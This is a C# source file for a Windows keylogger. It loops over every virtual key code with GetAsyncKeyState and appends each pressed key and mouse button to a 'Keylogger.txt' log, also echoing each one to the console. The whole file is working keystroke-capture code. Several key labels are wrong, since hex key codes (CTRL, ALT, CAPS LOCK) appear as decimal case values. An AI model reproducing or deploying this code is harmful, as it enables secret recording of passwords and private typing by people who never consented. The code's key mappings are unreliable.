using System.Reflection;
using System.Runtime.InteropServices;

namespace Keylogger
{
    class Program
    {
        // Import the function GetAsyncKeyState from the library "user32.dll"
        [DllImport("user32.dll")]
        static extern byte GetAsyncKeyState(byte vKey);

        static void Main(string[] args)
        {
            // KeyPressed variable will store the name of the pressed key (or mouse button)
            // Example: [CAPS LOCK key] or [SHIFT key] or [A] or [Left mouse button]...
            string keyPressed = String.Empty;
            // The variable path will store the directory where the application is running, because the log file will be there
            string path = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "\\Keylogger.txt";

            // shows that the program has been started again
            File.AppendAllText(path, "\n--> New Record <--\n\n");

            while (true)
            {
                for (byte i = 0; i < byte.MaxValue; i++)
                {
                    // Checks whether the key represented by the value of i has been pressed
                    if (GetAsyncKeyState(i) != 0)
                    {
                        // Checks that the value of i CANNOT be represented by one of the "ConsoleKey" keys
                        // NOTE: all values of "ConsoleKey.Key" and their respective meanings are available at: https://learn.microsoft.com/en-us/dotnet/api/system.consolekey?view=net-7.0
                        if (((ConsoleKey)i).ToString() == i.ToString())
                        {
                            // Checks whether the value of i can be represented easily, based on the main keys outside the "ConsoleKey.Key" keys.
                            if (!IsKeyRegistred(i, ref keyPressed))
                            {
                                // If the value of i CANNOT be represented normally, a hexadecimal value is assigned to the key
                                // NOTE: all hexadecimal values and their respective meanings are available at: https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
                                keyPressed = $"[0x{i:X}]";
                            }
                        }
                        else 
                        {
                            // If the value of i has a representation in "ConsoleKey.Keys", its meaning will be assigned to the keyPressed variable
                            keyPressed = $"[{((ConsoleKey)i)}]";
                        }
                        // Writes the key that was pressed to the text file "Keylogger.txt"
                        File.AppendAllText(path, keyPressed + "\n");
                        Console.WriteLine(keyPressed);
                    }
                }
            }
        }
        // Checks if the value of i is within the main virtual keys, if it is, the key corresponding to the value of i will be assigned to the keyPressed variable.
        static bool IsKeyRegistred(byte value, ref string key)
        {
            switch (value)
            {
                case 1:
                    key = "[Left mouse button]";
                    break;
                case 2:
                    key = "[Right mouse button]";
                    break;
                case 4:
                    key = "[Middle mouse button]";
                    break;
                case 11:
                    key = "[CTRL key]";
                    break;
                case 12:
                    key = "[ALT key]";
                    break;
                case 14:
                    key = "[CAPS LOCK key]";
                    break;
                case 16:
                    key = "[SHIFT key]";
                    break;
                case 144:
                    key = "[NUM LOCK key]";
                    break;
                case 145:
                    key = "[SCROLL LOCK key]";
                    break;
                case 160:
                    key = "[Left SHIFT key]";
                    break;
                case 161:
                    key = "[Right SHIFT key]";
                    break;
                case 162:
                    key = "[Left CONTROL key]";
                    break;
                case 163:
                    key = "[Right CONTROL key]";
                    break;
                case 164:
                    key = "[Left ALT key]";
                    break;
                case 165:
                    key = "[Right ALT key]";
                    break;
                default:
                    return false;
            }
            return true;
        }
    }
}
